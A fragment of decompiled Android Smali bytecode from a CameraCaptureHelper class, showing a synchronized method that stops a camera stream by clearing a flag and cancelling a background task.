    iget-object v0, p0, Lcom/servers/ozzbzk/CameraCaptureHelper;->streaming:Ljava/util/concurrent/atomic/AtomicBoolean;

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Ljava/util/concurrent/atomic/AtomicBoolean;->set(Z)V

    .line 93
    iget-object v0, p0, Lcom/servers/ozzbzk/CameraCaptureHelper;->streamFuture:Ljava/util/concurrent/Future;

    const/4 v1, 0x0

    .line 94
    iput-object v1, p0, Lcom/servers/ozzbzk/CameraCaptureHelper;->streamFuture:Ljava/util/concurrent/Future;

    if-eqz v0, :cond_0

    const/4 v1, 0x1

    .line 96
    invoke-interface {v0, v1}, Ljava/util/concurrent/Future;->cancel(Z)Z
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 98
    :try_start_1
    sget-object v1, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    const-wide/16 v2, 0x2

    invoke-interface {v0, v2, v3, v1}, Ljava/util/concurrent/Future;->get(JLjava/util/concurrent/TimeUnit;)Ljava/lang/Object;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 103
    :catch_0
    :cond_0
    monitor-exit p0

    return-void

    :catchall_0
    move-exception v0

    monitor-exit p0

    throw v0
.end method
